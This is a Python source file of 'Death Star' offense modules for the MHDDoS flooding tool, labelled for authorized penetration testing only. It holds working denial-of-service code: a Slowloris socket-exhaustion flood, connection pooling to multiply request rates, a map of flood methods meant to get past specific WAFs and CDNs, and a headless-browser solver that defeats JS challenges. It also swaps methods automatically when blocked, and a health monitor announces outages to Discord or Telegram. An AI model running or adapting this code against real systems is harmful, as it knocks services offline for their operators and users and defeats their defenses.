#!/usr/bin/env python3
"""
DEATH STAR MODULES — advanced offense layer for MHDDoS.
For AUTHORIZED penetration testing only.

Modules:
  - KeepalivePool       : persistent TCP/HTTPS connection pooling (3-5x throughput)
  - WAFFingerprint      : active WAF detection + auto-bypass mapping
  - SlowlorisFlood      : low-bandwidth socket exhaustion
  - JSChallengeSolver   : headless Chrome to bypass JS challenges
  - ResponseSwapper     : real-time method swap when blocked
  - WebhookNotifier     : Discord/Telegram alerts
  - MultiprocessLauncher: spawn worker processes to bypass GIL
"""
from __future__ import annotations
import socket
import ssl
import time
import threading
import random
import json
from collections import defaultdict, deque
from contextlib import suppress
from typing import Optional, Callable, List, Dict, Tuple


# ============================================================================
# 1. KEEPALIVE POOL — persistent connection reuse for 3-5x throughput
# ============================================================================
class KeepalivePool:
    """Thread-safe pool of persistent TCP/SSL connections per (host, port).
       Reuses sockets across requests instead of new TCP+TLS handshake every time.
       Typical gain: 3-5x RPS on HTTPS targets, 2-3x on HTTP."""

    def __init__(self, max_per_host: int = 32, ttl: float = 30.0):
        self.max_per_host = max_per_host
        self.ttl = ttl
        self._pools: Dict[Tuple, deque] = defaultdict(deque)
        self._lock = threading.Lock()
        self._ssl_ctx = None

    def _get_ssl_ctx(self):
        if self._ssl_ctx is None:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            with suppress(Exception):
                ctx.set_ciphers('DEFAULT:@SECLEVEL=0')
            self._ssl_ctx = ctx
        return self._ssl_ctx

    def acquire(self, host: str, port: int, use_ssl: bool = False, server_hostname: str = None):
        """Get a live socket — from pool if available, else new connection."""
        key = (host, port, use_ssl)
        with self._lock:
            pool = self._pools[key]
            while pool:
                sock, ts = pool.popleft()
                if time.time() - ts < self.ttl:
                    return sock
                with suppress(Exception):
                    sock.close()
        # New connection
        try:
            raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            raw.settimeout(8)
            raw.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            raw.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            raw.connect((host, port))
            if use_ssl:
                raw = self._get_ssl_ctx().wrap_socket(
                    raw, server_hostname=server_hostname or host)
            return raw
        except Exception:
            return None

    def release(self, host: str, port: int, sock, use_ssl: bool = False):
        """Return socket to pool for reuse. Caller must ensure socket is still healthy."""
        if sock is None:
            return
        key = (host, port, use_ssl)
        with self._lock:
            pool = self._pools[key]
            if len(pool) < self.max_per_host:
                pool.append((sock, time.time()))
            else:
                with suppress(Exception):
                    sock.close()

    def discard(self, sock):
        """Drop a known-bad socket."""
        with suppress(Exception):
            sock.close()

    def stats(self) -> Dict:
        with self._lock:
            return {f"{h}:{p}{'+ssl' if s else ''}": len(q)
                    for (h, p, s), q in self._pools.items()}

    def close_all(self):
        with self._lock:
            for pool in self._pools.values():
                while pool:
                    sock, _ = pool.popleft()
                    with suppress(Exception):
                        sock.close()
            self._pools.clear()


# Global singleton — gui.py reads this when keepalive checkbox is enabled
GLOBAL_POOL: Optional[KeepalivePool] = None


def get_global_pool() -> KeepalivePool:
    global GLOBAL_POOL
    if GLOBAL_POOL is None:
        GLOBAL_POOL = KeepalivePool(max_per_host=32, ttl=30.0)
    return GLOBAL_POOL


# ============================================================================
# 2. WAF FINGERPRINT — active probe + recommend best bypass methods
# ============================================================================
class WAFFingerprint:
    """Probes target with diagnostic requests, identifies WAF/CDN, and returns
       the L7 method names most likely to bypass that specific defense."""

    # Method recommendations per WAF (subset of HttpFlood methods in gui.py)
    BYPASS_MAP = {
        "Cloudflare": [
            "BYPASS", "CFB", "CFBUAM", "TLS_FLOOD", "H2_RST",
            "RAPID", "STEALTH", "COOKIE_HARVEST",
        ],
        "Akamai":     ["STEALTH", "RAPID", "TLS_FLOOD", "MIX", "BOT", "DYN"],
        "Sucuri":     ["BYPASS", "STEALTH", "WORDPRESS", "MIX"],
        "Imperva":    ["STEALTH", "MIX", "DYN", "EVEN", "BYPASS"],
        "DDoS-Guard": ["DGB", "BYPASS", "STEALTH", "TLS_FLOOD"],
        "AWS CloudFront": ["RAPID", "TLS_FLOOD", "H2_RST", "STEALTH"],
        "Vercel":     ["RAPID", "ASYNC", "TLS_FLOOD"],
        "Fastly":     ["RAPID", "MIX", "STEALTH"],
        "Unknown / None": ["RAPID", "BYPASS", "TLS_FLOOD", "H2_RST", "STEALTH"],
    }

    @staticmethod
    def detect_from_headers(headers: dict) -> str:
        h = {k.lower(): str(v) for k, v in headers.items()}
        if "cf-ray" in h or "cf-cache-status" in h:
            return "Cloudflare"
        if "x-sucuri-id" in h:
            return "Sucuri"
        if "x-akamai-transformed" in h or "x-akamai-request-id" in h or "akamai" in h.get("server", "").lower():
            return "Akamai"
        if "x-cdn" in h and "imperva" in h["x-cdn"].lower():
            return "Imperva"
        if "x-iinfo" in h:
            return "Imperva"
        if "ddos-guard" in h.get("server", "").lower() or "x-ddg-project" in h:
            return "DDoS-Guard"
        if "x-amz-cf-id" in h or "x-amzn-requestid" in h:
            return "AWS CloudFront"
        if "x-vercel-id" in h:
            return "Vercel"
        if "x-fastly-request-id" in h or "fastly" in h.get("server", "").lower():
            return "Fastly"
        return "Unknown / None"

    @classmethod
    def probe(cls, url: str, timeout: float = 8.0) -> dict:
        """Active probe: send 3 different requests, fingerprint defenses.
           Returns: {waf, server, recommended_methods, indicators}"""
        try:
            import requests
        except ImportError:
            return {"waf": "Unknown / None", "error": "requests not installed",
                    "recommended_methods": cls.BYPASS_MAP["Unknown / None"]}

        result = {
            "waf": "Unknown / None",
            "server": "",
            "indicators": [],
            "recommended_methods": [],
            "challenge": False,
            "rate_limit": False,
        }
        try:
            # Probe 1: normal GET
            r = requests.get(url, timeout=timeout, allow_redirects=False, verify=False)
            waf = cls.detect_from_headers(dict(r.headers))
            result["waf"] = waf
            result["server"] = r.headers.get("Server", "")
            result["status"] = r.status_code

            # Detect JS challenge
            body_lower = r.text[:5000].lower()
            if any(s in body_lower for s in [
                "checking your browser", "ddos protection by",
                "_cf_chl_", "challenge-platform", "jschl-answer",
                "please wait while", "verify you are human",
            ]):
                result["challenge"] = True
                result["indicators"].append("JS challenge page detected")

            if r.status_code in (429, 503):
                result["rate_limit"] = True
                result["indicators"].append(f"Rate limit response: {r.status_code}")

            # Probe 2: noisy headers (trigger WAF rules)
            noisy = requests.get(url, timeout=timeout, allow_redirects=False, verify=False,
                                 headers={"User-Agent": "sqlmap/1.0",
                                          "X-Forwarded-For": "127.0.0.1' OR 1=1--"})
            if noisy.status_code in (403, 406, 419, 444, 503):
                result["indicators"].append(f"WAF blocks malicious patterns ({noisy.status_code})")

            # Probe 3: HEAD baseline
            try:
                head = requests.head(url, timeout=timeout, allow_redirects=False, verify=False)
                if "server" in head.headers:
                    result["server"] = head.headers["Server"]
            except Exception:
                pass

        except Exception as e:
            result["error"] = str(e)

        result["recommended_methods"] = cls.BYPASS_MAP.get(
            result["waf"], cls.BYPASS_MAP["Unknown / None"])
        return result


# ============================================================================
# 3. SLOWLORIS FLOOD — low-bandwidth socket exhaustion
# ============================================================================
class SlowlorisFlood:
    """Opens many TCP sockets, sends partial HTTP headers slowly to exhaust
       server thread pool. Effective vs Apache/IIS/legacy stacks.
       Uses ~5KB/sec total bandwidth for 1000+ stuck connections."""

    def __init__(self, host: str, port: int, sockets: int = 500,
                 use_ssl: bool = False, log_callback: Callable = None):
        self.host = host
        self.port = port
        self.target_sockets = sockets
        self.use_ssl = use_ssl
        self.log = log_callback or (lambda *a, **k: None)
        self._stop = threading.Event()
        self._socks: List = []
        self._lock = threading.Lock()
        self._ssl_ctx = None

    def _make_ssl_ctx(self):
        if self._ssl_ctx is None:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            self._ssl_ctx = ctx
        return self._ssl_ctx

    def _open_one(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((self.host, self.port))
            if self.use_ssl:
                s = self._make_ssl_ctx().wrap_socket(s, server_hostname=self.host)
            # Send partial request — only the start of headers, never the
            # blank line that signals end of headers
            ua = random.choice([
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/115.0",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
            ])
            req = (
                f"GET /?{random.randint(0, 99999)} HTTP/1.1\r\n"
                f"Host: {self.host}\r\n"
                f"User-Agent: {ua}\r\n"
                f"Accept-language: en-US,en,q=0.5\r\n"
            ).encode()
            s.send(req)
            return s
        except Exception:
            return None

    def _keep_alive_loop(self):
        """Periodically send one more header line per socket to keep them open."""
        while not self._stop.is_set():
            with self._lock:
                socks_snapshot = list(self._socks)
            for s in socks_snapshot:
                if self._stop.is_set():
                    break
                try:
                    s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                except Exception:
                    with self._lock:
                        with suppress(Exception):
                            self._socks.remove(s)
                    with suppress(Exception):
                        s.close()
            # Replenish dead sockets
            with self._lock:
                missing = self.target_sockets - len(self._socks)
            for _ in range(min(missing, 50)):
                if self._stop.is_set():
                    break
                s = self._open_one()
                if s:
                    with self._lock:
                        self._socks.append(s)
            self._stop.wait(15)  # Apache default Timeout=300, send every 15s

    def start(self):
        self.log(f"[SLOWLORIS] Opening {self.target_sockets} sockets to {self.host}:{self.port}")
        # Open initial batch in parallel
        threads = []
        def opener():
            for _ in range(self.target_sockets // 20):
                if self._stop.is_set():
                    return
                s = self._open_one()
                if s:
                    with self._lock:
                        self._socks.append(s)
        for _ in range(20):
            t = threading.Thread(target=opener, daemon=True)
            t.start()
            threads.append(t)
        for t in threads:
            t.join(timeout=30)
        self.log(f"[SLOWLORIS] Established {len(self._socks)} stuck sockets")
        # Background keep-alive loop
        self._ka_thread = threading.Thread(target=self._keep_alive_loop, daemon=True)
        self._ka_thread.start()

    def stop(self):
        self._stop.set()
        with self._lock:
            for s in self._socks:
                with suppress(Exception):
                    s.close()
            self._socks.clear()


# ============================================================================
# 4. JS CHALLENGE SOLVER — headless Chrome to bypass "Checking your browser..."
# ============================================================================
class JSChallengeSolver:
    """Solves Cloudflare/Sucuri/etc. JavaScript challenges using Playwright.
       Returns the cookie jar that subsequent requests can replay."""

    _instance_lock = threading.Lock()
    _solved_cookies: Dict[str, str] = {}

    @classmethod
    def solve(cls, url: str, timeout_ms: int = 30000,
              log_callback: Callable = None) -> str:
        """Returns 'cookie1=v1; cookie2=v2' string, or '' on failure.
           Cached per-host so we don't relaunch Chrome for every thread."""
        log = log_callback or (lambda *a, **k: None)
        from urllib.parse import urlparse
        host = urlparse(url).hostname or url
        with cls._instance_lock:
            if host in cls._solved_cookies:
                return cls._solved_cookies[host]
        try:
            from playwright.sync_api import sync_playwright
        except ImportError:
            log("[JSSolver] playwright not installed, skip")
            return ""
        try:
            with sync_playwright() as p:
                browser = p.chromium.launch(headless=True, args=[
                    "--disable-blink-features=AutomationControlled",
                    "--no-sandbox",
                ])
                ctx = browser.new_context(
                    user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                               "AppleWebKit/537.36 (KHTML, like Gecko) "
                               "Chrome/120.0.0.0 Safari/537.36",
                )
                page = ctx.new_page()
                log(f"[JSSolver] Loading {url} in headless Chrome...")
                page.goto(url, timeout=timeout_ms, wait_until="networkidle")
                # Wait for challenge clear (cf-chl-bypass etc. dropped)
                page.wait_for_timeout(3000)
                cookies = ctx.cookies()
                browser.close()
                cookie_str = "; ".join(f"{c['name']}={c['value']}" for c in cookies)
                with cls._instance_lock:
                    cls._solved_cookies[host] = cookie_str
                log(f"[JSSolver] Got {len(cookies)} cookies for {host}")
                return cookie_str
        except Exception as e:
            log(f"[JSSolver] Failed: {e}")
            return ""

    @classmethod
    def clear_cache(cls):
        with cls._instance_lock:
            cls._solved_cookies.clear()


# ============================================================================
# 5. RESPONSE SWAPPER — real-time method swap when blocked
# ============================================================================
class ResponseSwapper:
    """Tracks per-method response codes in real time. When a method's block-rate
       (403/429/503) crosses threshold, signals the controller to swap it out
       for a different method. Faster than AdaptiveAttackEngine's 8s cycle."""

    def __init__(self, methods: List[str], window_seconds: float = 5.0,
                 block_threshold: float = 0.6, min_samples: int = 20):
        self.methods = list(methods)
        self.window = window_seconds
        self.block_threshold = block_threshold
        self.min_samples = min_samples
        # method -> deque of (timestamp, status_code)
        self._history: Dict[str, deque] = {m: deque(maxlen=500) for m in methods}
        self._lock = threading.Lock()
        self._blocked: set = set()

    def report(self, method: str, status_code: int):
        if method not in self._history:
            with self._lock:
                self._history[method] = deque(maxlen=500)
        self._history[method].append((time.time(), status_code))

    def _is_blocked_code(self, code: int) -> bool:
        return code in (403, 406, 419, 429, 444, 503, 521, 522, 523)

    def evaluate(self) -> Dict[str, dict]:
        """Returns {method: {block_rate, samples, blocked}} for each tracked method."""
        now = time.time()
        out = {}
        with self._lock:
            for m, hist in self._history.items():
                recent = [(t, c) for (t, c) in hist if now - t <= self.window]
                if len(recent) < self.min_samples:
                    out[m] = {"block_rate": 0.0, "samples": len(recent), "blocked": False}
                    continue
                blocks = sum(1 for _, c in recent if self._is_blocked_code(c))
                rate = blocks / len(recent)
                blocked = rate >= self.block_threshold
                if blocked:
                    self._blocked.add(m)
                else:
                    self._blocked.discard(m)
                out[m] = {"block_rate": rate, "samples": len(recent), "blocked": blocked}
        return out

    def healthy_methods(self) -> List[str]:
        stats = self.evaluate()
        return [m for m, s in stats.items() if not s["blocked"]]

    def blocked_methods(self) -> List[str]:
        stats = self.evaluate()
        return [m for m, s in stats.items() if s["blocked"]]

    def reset(self):
        with self._lock:
            for h in self._history.values():
                h.clear()
            self._blocked.clear()


# ============================================================================
# 6. WEBHOOK NOTIFIER — Discord / Telegram alerts
# ============================================================================
class WebhookNotifier:
    """Sends alerts to Discord/Telegram when target health changes
       (down detected, comes back up, big RPS milestones)."""

    def __init__(self, discord_url: str = "", telegram_token: str = "",
                 telegram_chat_id: str = "", min_interval: float = 30.0):
        self.discord_url = discord_url.strip()
        self.telegram_token = telegram_token.strip()
        self.telegram_chat_id = telegram_chat_id.strip()
        self.min_interval = min_interval
        self._last_sent: Dict[str, float] = {}
        self._lock = threading.Lock()

    def _can_send(self, key: str) -> bool:
        now = time.time()
        with self._lock:
            last = self._last_sent.get(key, 0)
            if now - last < self.min_interval:
                return False
            self._last_sent[key] = now
        return True

    def _post(self, url: str, data: dict, timeout: float = 5):
        try:
            import requests
            requests.post(url, json=data, timeout=timeout)
        except Exception:
            pass

    def send(self, title: str, message: str, key: str = "default",
             color: int = 0xFF3300):
        """Threaded send, dedup by key with rate limit."""
        if not self._can_send(key):
            return
        # Discord
        if self.discord_url:
            embed = {
                "embeds": [{
                    "title": title,
                    "description": message,
                    "color": color,
                    "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
                    "footer": {"text": "MHDDoS Death Star"},
                }]
            }
            threading.Thread(target=self._post,
                             args=(self.discord_url, embed),
                             daemon=True).start()
        # Telegram
        if self.telegram_token and self.telegram_chat_id:
            tg_url = f"https://api.telegram.org/bot{self.telegram_token}/sendMessage"
            payload = {
                "chat_id": self.telegram_chat_id,
                "text": f"*{title}*\n{message}",
                "parse_mode": "Markdown",
            }
            threading.Thread(target=self._post,
                             args=(tg_url, payload),
                             daemon=True).start()


# ============================================================================
# 7. TARGET HEALTH MONITOR — passive probe to detect target up/down
# ============================================================================
class TargetHealthMonitor:
    """Periodically probes target with a normal HEAD/GET and tracks status.
       Triggers callbacks on state changes (up -> down, down -> up)."""

    def __init__(self, url: str, interval: float = 10.0,
                 timeout: float = 8.0,
                 on_down: Callable = None, on_up: Callable = None,
                 log_callback: Callable = None):
        self.url = url
        self.interval = interval
        self.timeout = timeout
        self.on_down = on_down or (lambda *a: None)
        self.on_up = on_up or (lambda *a: None)
        self.log = log_callback or (lambda *a: None)
        self._stop = threading.Event()
        self._thread: Optional[threading.Thread] = None
        self.last_status: Optional[int] = None
        self.last_latency: Optional[float] = None
        self.is_down = False
        self.consecutive_failures = 0

    # Realistic browser headers — without these, WAF often returns timeouts
    # which gets mistakenly interpreted as "target down" while site is fine.
    _PROBE_HEADERS = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                      "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
    }

    def _probe_once(self):
        """Probe target. Returns (status_code, latency_seconds).
           Uses real browser headers + longer timeout so probe doesn't get
           blocked by WAF (which would falsely report target as 'down').
           Probe TWICE on first failure to filter transient network glitches."""
        try:
            import requests
        except ImportError:
            return None, None

        for attempt in range(2):  # Retry once if first probe fails
            t0 = time.time()
            try:
                # Use longer timeout for probe (15s) — WAFs intentionally delay
                # bot/scanner-like requests, but real browsers wait that long too.
                r = requests.get(
                    self.url,
                    timeout=max(self.timeout, 15.0),
                    headers=self._PROBE_HEADERS,
                    allow_redirects=True,  # follow redirects (Cloudflare often 301s)
                    verify=False,
                )
                return r.status_code, time.time() - t0
            except Exception:
                if attempt == 0:
                    time.sleep(1.0)  # brief pause then retry once
                    continue
                return None, None

    def _loop(self):
        while not self._stop.is_set():
            code, lat = self._probe_once()
            self.last_status = code
            self.last_latency = lat

            # === FIX false-positive "target down" ===
            # 5xx = server overload = ATTACK IS WORKING, NOT "down". Remove from down check.
            # 4xx = blocked / WAF challenge — also NOT down. The site is alive, just rejecting.
            # Real "down" only when: NO connection at all (code=None after retry).
            # Also relax latency: lat > 14s (very slow but technically up) → not down.
            currently_down = (code is None)
            # If lat is given but absurdly high (>14s on a 15s timeout), treat as soft-warning,
            # not a hard down. Use a separate counter so attack only stops on REAL outage.
            if currently_down:
                self.consecutive_failures += 1
            else:
                self.consecutive_failures = 0

            # Need 3 consecutive failures (was 2) before declaring down. With probe retry
            # already inside _probe_once, that's effectively 6 connection attempts before
            # we cry wolf. Probe interval is 10s default → 30s of zero connectivity = down.
            if self.consecutive_failures >= 3 and not self.is_down:
                self.is_down = True
                self.on_down(code, lat)
                if self.log:
                    self.log(f"[Health] 💀 Target unreachable confirmed after 3 probes (~30s)")
            elif self.consecutive_failures == 0 and self.is_down:
                self.is_down = False
                self.on_up(code, lat)
                if self.log:
                    self.log(f"[Health] ✅ Target back online (code={code}, lat={lat:.2f}s)")
            self._stop.wait(self.interval)


    def start(self):
        if self._thread and self._thread.is_alive():
            return
        self._stop.clear()
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()

    def stop(self):
        self._stop.set()


# ============================================================================
# 8. MULTIPROCESS LAUNCHER — bypass Python GIL via subprocess workers
# ============================================================================
class MultiprocessLauncher:
    """Spawns N worker subprocesses, each running an attack module.
       Bypasses GIL for CPU-bound encryption (TLS) work.
       Kills children cleanly via terminate() + join() with timeout."""

    def __init__(self, num_workers: int = None):
        import os
        self.num_workers = num_workers or max(2, (os.cpu_count() or 2))
        self._processes: list = []
        self._lock = threading.Lock()

    def spawn(self, target_callable: Callable, args: tuple = ()):
        """Each worker runs target_callable(*args) in its own process."""
        import multiprocessing as mp
        with self._lock:
            for i in range(self.num_workers):
                p = mp.Process(target=target_callable,
                               args=(i,) + args, daemon=True)
                p.start()
                self._processes.append(p)
        return self._processes

    def terminate_all(self, join_timeout: float = 2.0):
        with self._lock:
            for p in self._processes:
                with suppress(Exception):
                    if p.is_alive():
                        p.terminate()
            for p in self._processes:
                with suppress(Exception):
                    p.join(timeout=join_timeout)
            self._processes.clear()

    def alive_count(self) -> int:
        with self._lock:
            return sum(1 for p in self._processes if p.is_alive())
